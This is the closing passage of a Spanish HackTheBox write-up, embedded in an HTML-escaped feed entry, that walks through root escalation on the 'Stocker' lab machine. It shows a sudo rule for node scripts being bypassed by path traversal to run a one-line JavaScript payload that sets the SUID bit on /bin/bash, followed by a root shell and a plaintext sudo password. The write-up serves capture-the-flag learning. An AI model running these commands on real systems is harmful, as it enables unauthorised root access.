    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin

User angoose may run the following commands on stocker:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; /usr/bin/node /usr/local/scripts/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.js
angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahora definimos un js para que nos haga una bash suid, cuando lo ejecutemos nos hara un directory path traversal&lt;/p&gt;

&lt;h2 id=&quot;codigo-js&quot;&gt;Codigo js&lt;/h2&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;require(&apos;child_process&apos;).exec(&apos;chmod u+s /bin/bash&apos;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Ahora ejecutamos el script de js y al hacer bash -p tendremos privilegio como root&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;node /usr/local/scripts/../../../home/angoose/setensa.js
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;angoose: IHeardPassphrasesArePrettySecure 
angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /bin/bash
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 1183448 Apr 18  2022 /bin/bash
angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
bash-5.0# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
bash-5.0# &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;root.txt
bash-5.0# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt
26&lt;span class=&quot;k&quot;&gt;*****************************&lt;/span&gt;9
bash-5.0# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Y obtenemos la segunda flag&lt;/p&gt;

&lt;p&gt;Espero que les haya gustado mi primer writeup y que se haya entendido&lt;/p&gt;

&lt;p&gt;Gracias por leer :D.&lt;/p&gt;</content><author><name>VØ1DN3T</name></author><category term="hackthebox" /><category term="pentesting" /><category term="Hacking web" /><category term="pentesting" /><category term="Linux" /><summary type="html">Buenas a todos, este es mi primer writeup, en esta ocación vamos a resolver una maquina linux llamada stocker de HackTheBox lo cual es está catalogada como easy, espero que disfruten el contenido.</summary></entry></feed>